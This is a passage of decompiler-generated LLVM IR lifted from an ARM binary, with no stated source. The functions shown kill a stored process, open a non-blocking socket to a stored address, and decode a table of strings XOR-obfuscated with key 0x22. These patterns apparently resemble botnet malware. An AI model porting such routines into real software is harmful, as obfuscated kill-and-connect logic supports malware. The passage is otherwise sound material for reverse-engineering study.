  %v2_11fa4 = inttoptr i32 %v1_11fa4 to i8*
  %v3_11fa4 = load i8, i8* %v2_11fa4, align 1
  %v4_11fa4 = zext i8 %v3_11fa4 to i32
  store i32 %v4_11fa4, i32* %r2.global-to-local, align 4
  store i32 %v2_11ad8, i32* %lr.global-to-local, align 4
  %v2_11fb0 = load i8, i8* %v3_11ad8, align 1
  %v3_11fb0 = zext i8 %v2_11fb0 to i32
  %v3_11fb4 = mul nuw nsw i32 %v3_11fb0, 4
  %v1_11fb8 = add nuw nsw i32 %v3_11fb4, 4
  store i32 %v1_11fb8, i32* %r1.global-to-local, align 4
  %v3_11fbc = load i32, i32* %v2_11fbc, align 4
  store i32 %v3_11fbc, i32* %r0.global-to-local, align 4
  %v3_11fc0 = sext i8 %v3_11fa4 to i32
  %v5_11fc0 = sext i8 %v3_11f98 to i32
  %v10_11fc0 = call i32 @_realloc(i32 %v3_11fbc, i32 %v1_11fb8, i32 %v3_11fc0, i32 %v5_11fc0)
  store i32 %v10_11fc0, i32* %r0.global-to-local, align 4
  store i32 %v2_11ad8, i32* %r1.global-to-local, align 4
  store i32 %v2_11b58, i32* %ip.global-to-local, align 4
  %v2_11fcc = load i8, i8* %v3_11ad8, align 1
  %v3_11fcc = zext i8 %v2_11fcc to i32
  store i32 %v3_11fcc, i32* %r2.global-to-local, align 4
  %v4_11fd0 = sext i8 %v3_11f80 to i32
  store i32 %v4_11fd0, i32* %r3.global-to-local, align 4
  store i32 %v2_11ad8, i32* %lr.global-to-local, align 4
  %v1_11fd8 = add nuw nsw i32 %v3_11fcc, 1
  store i32 %v1_11fd8, i32* %r1.global-to-local, align 4
  %v5_11fdc = mul nuw nsw i32 %v3_11fcc, 4
  %v6_11fdc = add i32 %v5_11fdc, %v10_11fc0
  %v7_11fdc = inttoptr i32 %v6_11fdc to i32*
  store i32 %v4_11fd0, i32* %v7_11fdc, align 4
  %v1_11fe0 = load i32, i32* %lr.global-to-local, align 4
  %v2_11fe0 = add i32 %v1_11fe0, 4
  %v3_11fe0 = inttoptr i32 %v2_11fe0 to i32*
  store i32 %v10_11fc0, i32* %v3_11fe0, align 4
  %v0_11fe4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11fe4 = trunc i32 %v0_11fe4 to i8
  %v2_11fe4 = load i32, i32* %lr.global-to-local, align 4
  %v3_11fe4 = inttoptr i32 %v2_11fe4 to i8*
  store i8 %v1_11fe4, i8* %v3_11fe4, align 1
  %v0_11fe8 = load i32, i32* %r4.global-to-local, align 4
  %v1_11fe8 = add i32 %v0_11fe8, 9
  %v2_11fe8 = inttoptr i32 %v1_11fe8 to i8*
  %v3_11fe8 = load i8, i8* %v2_11fe8, align 1
  %v4_11fe8 = zext i8 %v3_11fe8 to i32
  store i32 %v4_11fe8, i32* %r0.global-to-local, align 4
  %v1_11fec = add i32 %v0_11fe8, 8
  %v2_11fec = inttoptr i32 %v1_11fec to i8*
  %v3_11fec = load i8, i8* %v2_11fec, align 1
  %v4_11fec = zext i8 %v3_11fec to i32
  store i32 %v4_11fec, i32* %r1.global-to-local, align 4
  %v0_12004.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_11e2c.pre.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11ff0

dec_label_pc_11ff0:                               ; preds = %dec_label_pc_11f5c, %dec_label_pc_11f80
  %v0_11e2c.pre.pre = phi i32 [ %v3_11e38153, %dec_label_pc_11f5c ], [ %v0_11e2c.pre.pre.pre, %dec_label_pc_11f80 ]
  %v0_12004 = phi i32 [ %v1_11ea8, %dec_label_pc_11f5c ], [ %v0_12004.pre, %dec_label_pc_11f80 ]
  %v1_11ff0 = phi i32 [ %v4_11f60, %dec_label_pc_11f5c ], [ %v4_11fe8, %dec_label_pc_11f80 ]
  %v0_11ff0 = phi i32 [ %v4_11f5c, %dec_label_pc_11f5c ], [ %v4_11fec, %dec_label_pc_11f80 ]
  %v4_11ff0 = mul nuw nsw i32 %v1_11ff0, 256
  %v5_11ff0 = or i32 %v4_11ff0, %v0_11ff0
  %v3_11ff4 = mul i32 %v5_11ff0, 65536
  store i32 %v3_11ff4, i32* %r2.global-to-local, align 4
  %tmp133 = mul nuw nsw i32 %v0_11ff0, 256
  %v5_12000 = or i32 %tmp133, %v1_11ff0
  store i32 %v5_12000, i32* %r3.global-to-local, align 4
  %v2_12004 = add i32 %v5_12000, %v0_12004
  br label %dec_label_pc_11e2c.backedge

; uselistorder directives
  uselistorder i32 %v1_11ff0, { 1, 0 }
  uselistorder i32 %v3_11fcc, { 1, 0, 2 }
  uselistorder i32 %v10_11fc0, { 1, 0, 2 }
  uselistorder i32 %v4_11f60, { 2, 1, 0, 3 }
  uselistorder i32 %v4_11f5c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_11f40, { 1, 0 }
  uselistorder i32 %v3_11ebc, { 0, 2, 1 }
  uselistorder i32 %v1_11f4064, { 1, 0 }
  uselistorder i32 %v1_11f3c, { 1, 2, 0 }
  uselistorder i32 %v2_11f30, { 1, 0 }
  uselistorder i32 %v3_11e4c, { 0, 2, 1 }
  uselistorder i32 %v1_11f3049, { 1, 0 }
  uselistorder i32 %v1_11f2c, { 1, 2, 0 }
  uselistorder i1 %v7_11e34, { 1, 0 }
  uselistorder i32 %v1_11e2c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v3_11ee8, { 0, 2, 1 }
  uselistorder i32 %v2_11ee4, { 1, 2, 0 }
  uselistorder i32 %v0_11f38, { 2, 0, 1 }
  uselistorder i32 %v1_11f40, { 1, 2, 0 }
  uselistorder i32 %v3_11ec427, { 1, 0 }
  uselistorder i32 %v3_11ebc25, { 1, 0, 2 }
  uselistorder i32 %v1_11ea8, { 2, 3, 1, 0, 5, 4, 6 }
  uselistorder i32 %v2_11e94, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_11e78, { 0, 2, 1 }
  uselistorder i32 %v2_11e74, { 1, 2, 0 }
  uselistorder i32 %v0_11f28, { 2, 0, 1 }
  uselistorder i32 %v1_11f30, { 1, 2, 0 }
  uselistorder i32 %v3_11e5421, { 1, 0 }
  uselistorder i32 %v3_11e4c19, { 1, 0, 2 }
  uselistorder i32 %v0_11e94152, { 3, 0, 1, 2 }
  uselistorder i32 %v3_11e38151, { 1, 0 }
  uselistorder i1 %v7_11e34150, { 1, 0 }
  uselistorder i32 %v1_11e2c143, { 1, 0 }
  uselistorder i32 %v4_11e14, { 1, 0, 2 }
  uselistorder i32 %v0_11d98, { 1, 0 }
  uselistorder i32 %v0_11d70, { 1, 0 }
  uselistorder i1 %v7_11d24, { 1, 0 }
  uselistorder i32 %v5_11d20, { 1, 0, 2 }
  uselistorder i32 %v1_11ce4, { 1, 0 }
  uselistorder i32 %v3_11cd0, { 1, 0 }
  uselistorder i32 %v0_11cc8, { 1, 0 }
  uselistorder i32 %v1_11cbc, { 1, 2, 0 }
  uselistorder i1 %v7_11c88, { 1, 0 }
  uselistorder i32 %v4_11c84, { 1, 0, 2 }
  uselistorder i1 %v7_11c6c, { 1, 0 }
  uselistorder i32 %v3_11c68, { 1, 0, 2 }
  uselistorder i1 %v7_11c50, { 1, 0 }
  uselistorder i32 %v3_11c4c, { 2, 1, 0, 3 }
  uselistorder i1 %v7_11c34, { 2, 1, 0 }
  uselistorder i32 %v1_11c38, { 1, 0 }
  uselistorder i32 %v1_11dd8, { 1, 2, 0 }
  uselistorder i32 %v2_11cd4, { 1, 0, 2 }
  uselistorder i32 %v2_11c30, { 1, 0, 2 }
  uselistorder i32 %v2_11bf8, { 4, 3, 2, 5, 7, 10, 9, 1, 0, 6, 8, 11 }
  uselistorder i32 %v4_11bac, { 3, 0, 2, 1 }
  uselistorder i32 %v2_11ba0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11b78, { 1, 0, 2 }
  uselistorder i32 %v0_11b34, { 0, 1, 3, 2 }
  uselistorder i32 %v1_11b30, { 1, 0, 2 }
  uselistorder i32 %v1_11b2c, { 1, 0 }
  uselistorder i32 %v2_11b2011, { 1, 0 }
  uselistorder i32 %v2_11b20, { 1, 0 }
  uselistorder i1 %v8_11b10, { 1, 0 }
  uselistorder i32 %v2_11af8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_11af0, { 1, 0 }
  uselistorder i32 %v0_11ae0, { 1, 0 }
  uselistorder i32 %v2_11ad8, { 2, 3, 4, 5, 6, 0, 1, 7, 8 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-2240, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i8* %stack_var_-4288, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 5, 1, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 9, 7, 10, 11, 13, 14, 15, 16, 12, 18, 17, 19, 20 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 10, 13, 11, 12, 14, 16, 33, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 34, 35, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 11, 7, 31, 9, 10, 30, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 11, 6, 7, 27, 9, 10, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 28, 23, 29, 25 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 7, 48, 8, 9, 10, 13, 12, 16, 15, 14, 18, 17, 21, 19, 20, 22, 23, 25, 24, 27, 26, 28, 30, 29, 31, 38, 33, 32, 34, 35, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15, 16 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 8, 2, 13, 3, 4, 14, 5, 6, 7, 34, 9, 10, 11, 12, 33, 36, 15, 16, 17, 18, 19, 20, 21, 22, 23, 35, 24, 25, 26, 27, 32, 30, 28, 29, 31, 37 }
  uselistorder i32 (i32)* @_free, { 0, 2, 1 }
  uselistorder i32 (i32)* @_sleep, { 8, 7, 11, 10, 9, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 53, { 1, 0, 2 }
  uselistorder i8 46, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder label %dec_label_pc_11ff0, { 1, 0 }
  uselistorder label %dec_label_pc_11ebc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_11e4c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_11e2c.backedge, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_11ecc, { 1, 0 }
  uselistorder label %dec_label_pc_11ecc.preheader, { 1, 0 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %dec_label_pc_11e5c, { 1, 0 }
  uselistorder label %dec_label_pc_11e5c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11e40, { 1, 0 }
  uselistorder label %dec_label_pc_11db8, { 1, 0 }
  uselistorder label %dec_label_pc_11da0, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11d80, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_11cb8.dec_label_pc_11cb8_crit_edge, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11b08, { 1, 0 }
}

define i32 @function_1200c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1200c:
  %v2_12010 = load i32, i32* @global_var_1d9d0.241, align 4
  %v3_12018 = call i32 @_kill(i32 %v2_12010, i32 9)
  %v0_1201c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1201c, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_1200c
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_1200c, %bb
  ret i32 %v3_12018

; uselistorder directives
  uselistorder i32 (i32, i32)* @_kill, { 15, 13, 12, 11, 10, 9, 14, 2, 1, 0, 8, 7, 6, 5, 4, 3 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_12020() local_unnamed_addr {
dec_label_pc_12020:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_12020 = load i32, i32* @r4, align 4
  store i32 %v3_12020, i32* %stack_var_-16, align 4
  %v0_12024 = load i32, i32* @r0, align 4
  store i32 %v0_12024, i32* %r5.global-to-local, align 4
  %v1_12028 = add i32 %v0_12024, 4
  %v2_12028 = inttoptr i32 %v1_12028 to i32*
  %v3_12028 = load i32, i32* %v2_12028, align 4
  store i32 %v3_12028, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v1_12048 = icmp ne i32 %v3_12028, -1
  call void @__pseudo_cond_branch(i1 %v1_12048, i32 ptrtoint (i32* @global_var_8dcc.80 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_12058 = call i32 @_socket(i32 2, i32 1, i32 0)
  store i32 %v3_12058, i32* %r3.global-to-local, align 4
  %v7_12060 = icmp eq i32 %v3_12058, -1
  %v0_12068 = load i32, i32* %r5.global-to-local, align 4
  %v1_12068 = add i32 %v0_12068, 28
  store i32 %v1_12068, i32* %r0.global-to-local, align 4
  %v2_1206c = add i32 %v0_12068, 4
  %v3_1206c = inttoptr i32 %v2_1206c to i32*
  store i32 %v3_12058, i32* %v3_1206c, align 4
  br i1 %v7_12060, label %dec_label_pc_12020.dec_label_pc_120e8_crit_edge, label %dec_label_pc_12074

dec_label_pc_12020.dec_label_pc_120e8_crit_edge:  ; preds = %dec_label_pc_12020
  %v14_120ec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120e8

dec_label_pc_12074:                               ; preds = %dec_label_pc_12020
  %v2_1202c = ptrtoint i32* %stack_var_-32 to i32
  %v0_12074 = load i32, i32* %r6.global-to-local, align 4
  %v1_12074 = load i32, i32* %r5.global-to-local, align 4
  %v2_12074 = add i32 %v1_12074, 24
  %v3_12074 = inttoptr i32 %v2_12074 to i32*
  store i32 %v0_12074, i32* %v3_12074, align 4
  %v0_12078 = load i32, i32* %r0.global-to-local, align 4
  %v2_12078 = call i32 @function_146ac(i32 %v0_12078, i32 256)
  store i32 %v2_12078, i32* %r0.global-to-local, align 4
  %v0_1207c = load i32, i32* %r5.global-to-local, align 4
  %v1_1207c = add i32 %v0_1207c, 4
  %v2_1207c = inttoptr i32 %v1_1207c to i32*
  %v3_1207c = load i32, i32* %v2_1207c, align 4
  %v0_12084 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v3_1207c, i32* %r0.global-to-local, align 4
  %v3_1208c = call i32 @_fcntl(i32 %v3_1207c, i32 3, i32 %v0_12084)
  %v1_12094 = or i32 %v3_1208c, 2048
  store i32 %v3_1207c, i32* %r0.global-to-local, align 4
  %v3_1209c = call i32 @_fcntl(i32 %v3_1207c, i32 4, i32 %v1_12094)
  store i32 %v3_1209c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d9a8.243 to i32), i32* %r3.global-to-local, align 4
  %v0_120a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_120a8 = load i32, i32* @global_var_1d9a8.243, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_120b4 = add i32 %v0_120a4, 8
  %v3_120b4 = inttoptr i32 %v2_120b4 to i32*
  store i32 %v2_120a8, i32* %v3_120b4, align 4
  %v0_120b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_120b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_120b8 = add i32 %v1_120b8, 12
  %v3_120b8 = inttoptr i32 %v2_120b8 to i32*
  store i32 %v0_120b8, i32* %v3_120b8, align 4
  %v0_120c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_120c0 = add i32 %v0_120c0, 4
  %v2_120c0 = inttoptr i32 %v1_120c0 to i32*
  %v3_120c0 = load i32, i32* %v2_120c0, align 4
  store i32 %v3_120c0, i32* %r0.global-to-local, align 4
  %v0_120c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_120c4 = mul i32 %v0_120c4, 2
  store i32 %v2_120c4, i32* %r3.global-to-local, align 4
  store i32 %v2_120c4, i32* %stack_var_-32, align 4
  %v3_120e4 = call i32 @_connect(i32 %v3_120c0, i32 %v2_1202c, i32 16)
  store i32 %v3_120e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120e8

dec_label_pc_120e8:                               ; preds = %dec_label_pc_12020.dec_label_pc_120e8_crit_edge, %dec_label_pc_12074
  %v14_120ec = phi i32 [ %v14_120ec.pre, %dec_label_pc_12020.dec_label_pc_120e8_crit_edge ], [ %v3_120e4, %dec_label_pc_12074 ]
  %v2_120ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_120ec, i32* @r4, align 4
  ret i32 %v14_120ec

; uselistorder directives
  uselistorder i32 %v2_120c4, { 1, 0 }
  uselistorder i32 %v3_1207c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_12058, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 8, 5, 6, 7, 9, 10 }
  uselistorder i32 (i32, i32)* @function_146ac, { 7, 12, 16, 15, 14, 13, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 5, 2, 3, 4, 0, 1, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_120e8, { 1, 0 }
}

define i32 @function_120f4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_120f4:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1d974.245 to i32), i32* %r8.global-to-local, align 4
  %v2_120fc = load i32, i32* @global_var_1d974.245, align 4
  store i32 ptrtoint (i32* @global_var_1d9a0.247 to i32), i32* %sb.global-to-local, align 4
  %v3_12108 = mul i32 %v2_120fc, 16
  store i32 %v3_12108, i32* %r3.global-to-local, align 4
  %v3_12110 = urem i32 %arg3, 65536
  store i32 %v3_12110, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_1211c = load i32, i32* @global_var_1d9a0.247, align 4
  %v1_12120 = add i32 %v3_12108, 16
  store i32 %v1_12120, i32* %r1.global-to-local, align 4
  store i32 %v3_12110, i32* %stack_var_-44, align 4
  %v8_12128 = call i32 @_realloc(i32 %v2_1211c, i32 %v1_12120, i32 %v3_12110, i32 %v3_12108)
  store i32 %v8_12128, i32* %sl.global-to-local, align 4
  %v0_12130 = load i32, i32* %r5.global-to-local, align 4
  %v1_12134 = load i32, i32* %sb.global-to-local, align 4
  %v2_12134 = inttoptr i32 %v1_12134 to i32*
  store i32 %v8_12128, i32* %v2_12134, align 4
  %v2_12138 = load i32, i32* @global_var_1d974.245, align 4
  store i32 %v2_12138, i32* %fp.global-to-local, align 4
  %v1_1213c = inttoptr i32 %v0_12130 to i8*
  %v2_1213c = call i32 @function_1460c(i8* %v1_1213c)
  %sext = mul i32 %v2_1213c, 16777216
  %v1_12140 = sdiv i32 %sext, 16777216
  %v2_12140 = add nsw i32 %v1_12140, 1
  store i32 %v1_12140, i32* %r7.global-to-local, align 4
  %v1_1214c = call i32 @_malloc(i32 %v2_12140)
  %v0_12150 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_12150, i32* %r1.global-to-local, align 4
  store i32 %v2_12140, i32* %r2.global-to-local, align 4
  store i32 %v1_1214c, i32* %r6.global-to-local, align 4
  %v3_1215c = call i32 @function_14688(i32 %v1_1214c, i32 %v0_12150, i32 %v2_12140)
  %v0_12160 = load i32, i32* %r7.global-to-local, align 4
  %tmp21 = icmp slt i32 %v0_12160, 1
  %extract.t6 = trunc i32 %v0_12160 to i8
  br i1 %tmp21, label %dec_label_pc_12184, label %dec_label_pc_12168

dec_label_pc_12168:                               ; preds = %dec_label_pc_120f4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1216c

dec_label_pc_1216c:                               ; preds = %dec_label_pc_1216c, %dec_label_pc_12168
  %v2_12174 = phi i32 [ %v1_12178, %dec_label_pc_1216c ], [ 0, %dec_label_pc_12168 ]
  %v1_1216c = load i32, i32* %r6.global-to-local, align 4
  %v2_1216c = add i32 %v1_1216c, %v2_12174
  %v3_1216c = inttoptr i32 %v2_1216c to i8*
  %v4_1216c = load i8, i8* %v3_1216c, align 1
  %v6_1216c = zext i8 %v4_1216c to i32
  %v1_12170 = xor i32 %v6_1216c, 34
  store i32 %v1_12170, i32* %r3.global-to-local, align 4
  %v1_12174 = trunc i32 %v1_12170 to i8
  store i8 %v1_12174, i8* %v3_1216c, align 1
  %v0_12178 = load i32, i32* %r2.global-to-local, align 4
  %v1_12178 = add i32 %v0_12178, 1
  store i32 %v1_12178, i32* %r2.global-to-local, align 4
  %v0_1217c = load i32, i32* %r7.global-to-local, align 4
  %v9_1217c = icmp eq i32 %v0_1217c, %v1_12178
  br i1 %v9_1217c, label %dec_label_pc_12184.loopexit, label %dec_label_pc_1216c

dec_label_pc_12184.loopexit:                      ; preds = %dec_label_pc_1216c
  %extract.t = trunc i32 %v1_12178 to i8
  br label %dec_label_pc_12184

dec_label_pc_12184:                               ; preds = %dec_label_pc_12184.loopexit, %dec_label_pc_120f4
  %v0_12194.off0 = phi i8 [ %extract.t, %dec_label_pc_12184.loopexit ], [ %extract.t6, %dec_label_pc_120f4 ]
  %v2_12184 = load i32, i32* @global_var_1d974.245, align 4
  %v2_12188 = load i32, i32* @global_var_1d9a0.247, align 4
  store i32 %v2_12188, i32* %r2.global-to-local, align 4
  %v3_1218c = mul i32 %v2_12184, 16
  %v2_12190 = add i32 %v2_12188, %v3_1218c
  store i32 %v2_12190, i32* %r3.global-to-local, align 4
  %v3_12194 = add i32 %v2_12190, 12
  %v4_12194 = inttoptr i32 %v3_12194 to i8*
  store i8 %v0_12194.off0, i8* %v4_12194, align 1
  %v0_12198 = load i32, i32* %r6.global-to-local, align 4
  %v1_12198 = load i32, i32* %sl.global-to-local, align 4
  %v2_12198 = load i32, i32* %fp.global-to-local, align 4
  %v5_12198 = mul i32 %v2_12198, 16
  %v6_12198 = add i32 %v5_12198, %v1_12198
  %v7_12198 = inttoptr i32 %v6_12198 to i32*
  store i32 %v0_12198, i32* %v7_12198, align 4
  %v2_121a0 = load i32, i32* @global_var_1d974.245, align 4
  store i32 %v2_121a0, i32* %r7.global-to-local, align 4
  %v2_121a4 = load i32, i32* @global_var_1d9a0.247, align 4
  store i32 %v2_121a4, i32* %sl.global-to-local, align 4
  %v1_121a8 = inttoptr i32 %arg2 to i8*
  %v2_121a8 = call i32 @function_1460c(i8* %v1_121a8)
  %sext1 = mul i32 %v2_121a8, 16777216
  %v1_121ac = sdiv i32 %sext1, 16777216
  %v2_121ac = add nsw i32 %v1_121ac, 1
  store i32 %v1_121ac, i32* %r5.global-to-local, align 4
  %v1_121b8 = call i32 @_malloc(i32 %v2_121ac)
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %v2_121ac, i32* %r2.global-to-local, align 4
  store i32 %v1_121b8, i32* %r6.global-to-local, align 4
  %v3_121c8 = call i32 @function_14688(i32 %v1_121b8, i32 %arg2, i32 %v2_121ac)
  %tmp22 = icmp slt i32 %sext1, 16777216
  %extract.t8 = trunc i32 %v1_121ac to i8
  br i1 %tmp22, label %dec_label_pc_121f0, label %dec_label_pc_121d4

dec_label_pc_121d4:                               ; preds = %dec_label_pc_12184
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_121d8

dec_label_pc_121d8:                               ; preds = %dec_label_pc_121d8, %dec_label_pc_121d4
  %v2_121e0 = phi i32 [ %v1_121e4, %dec_label_pc_121d8 ], [ 0, %dec_label_pc_121d4 ]
  %v1_121d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_121d8 = add i32 %v1_121d8, %v2_121e0
  %v3_121d8 = inttoptr i32 %v2_121d8 to i8*
  %v4_121d8 = load i8, i8* %v3_121d8, align 1
  %v6_121d8 = zext i8 %v4_121d8 to i32
  %v1_121dc = xor i32 %v6_121d8, 34
  store i32 %v1_121dc, i32* %r3.global-to-local, align 4
  %v1_121e0 = trunc i32 %v1_121dc to i8
  store i8 %v1_121e0, i8* %v3_121d8, align 1
  %v0_121e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_121e4 = add i32 %v0_121e4, 1
  store i32 %v1_121e4, i32* %r2.global-to-local, align 4
  %v0_121e8 = load i32, i32* %r5.global-to-local, align 4
  %v9_121e8 = icmp eq i32 %v0_121e8, %v1_121e4
  br i1 %v9_121e8, label %dec_label_pc_121f0.loopexit, label %dec_label_pc_121d8

dec_label_pc_121f0.loopexit:                      ; preds = %dec_label_pc_121d8
  %extract.t7 = trunc i32 %v1_121e4 to i8
  br label %dec_label_pc_121f0

dec_label_pc_121f0:                               ; preds = %dec_label_pc_121f0.loopexit, %dec_label_pc_12184
  %v0_12200.off0 = phi i8 [ %extract.t7, %dec_label_pc_121f0.loopexit ], [ %extract.t8, %dec_label_pc_12184 ]
  %v2_121f0 = load i32, i32* @global_var_1d974.245, align 4
  %v2_121f4 = load i32, i32* @global_var_1d9a0.247, align 4
  %v3_121f8 = mul i32 %v2_121f0, 16
  %v2_121fc = or i32 %v3_121f8, 13
  %v3_12200 = add i32 %v2_121fc, %v2_121f4
  %v4_12200 = inttoptr i32 %v3_12200 to i8*
  store i8 %v0_12200.off0, i8* %v4_12200, align 1
  %v2_12208 = load i32, i32* @global_var_1d974.245, align 4
  store i32 %v2_12208, i32* %lr.global-to-local, align 4
  %v4_1220c = load i8, i8* @global_var_1d9a5.250, align 1
  %v5_1220c = zext i8 %v4_1220c to i32
  %v3_12210 = load i8, i8* bitcast (i8** @global_var_1d9a4.249 to i8*), align 4
  %v4_12210 = zext i8 %v3_12210 to i32
  %v2_12214 = load i32, i32* @global_var_1d9a0.247, align 4
  %v4_12218 = mul nuw nsw i32 %v5_1220c, 256
  %v5_12218 = or i32 %v4_12210, %v4_12218
  store i32 %v5_12218, i32* %r2.global-to-local, align 4
  %v3_1221c = mul i32 %v2_12208, 16
  %v2_12220 = add i32 %v2_12214, %v3_1221c
  store i32 %v2_12220, i32* %r1.global-to-local, align 4
  %v3_12228 = add i32 %v2_12220, 9
  %v4_12228 = inttoptr i32 %v3_12228 to i8*
  store i8 %v4_1220c, i8* %v4_12228, align 1
  %v0_1222c = load i32, i32* %r2.global-to-local, align 4
  %v1_1222c = trunc i32 %v0_1222c to i8
  %v2_1222c = load i32, i32* %r1.global-to-local, align 4
  %v3_1222c = add i32 %v2_1222c, 8
  %v4_1222c = inttoptr i32 %v3_1222c to i8*
  store i8 %v1_1222c, i8* %v4_1222c, align 1
  %v4_12230 = load i8, i8* @global_var_1d9a5.250, align 1
  %v5_12230 = zext i8 %v4_12230 to i32
  %v3_12234 = load i8, i8* bitcast (i8** @global_var_1d9a4.249 to i8*), align 4
  %v4_12234 = zext i8 %v3_12234 to i32
  %v4_12238 = mul nuw nsw i32 %v5_12230, 256
  %v5_12238 = or i32 %v4_12234, %v4_12238
  %v2_1223c = load i32, i32* %stack_var_-44, align 4
  %v2_12240 = add i32 %v5_12238, %v2_1223c
  store i32 %v2_12240, i32* %r3.global-to-local, align 4
  %v3_122449 = udiv i32 %v2_12240, 256
  %v1_12248 = trunc i32 %v3_122449 to i8
  %v2_12248 = load i32, i32* %r1.global-to-local, align 4
  %v3_12248 = add i32 %v2_12248, 11
  %v4_12248 = inttoptr i32 %v3_12248 to i8*
  store i8 %v1_12248, i8* %v4_12248, align 1
  %v0_1224c = load i32, i32* %r3.global-to-local, align 4
  %v1_1224c = trunc i32 %v0_1224c to i8
  %v2_1224c = load i32, i32* %r1.global-to-local, align 4
  %v3_1224c = add i32 %v2_1224c, 10
  %v4_1224c = inttoptr i32 %v3_1224c to i8*
  store i8 %v1_1224c, i8* %v4_1224c, align 1
  %v4_12250 = load i8, i8* @global_var_1d9a5.250, align 1
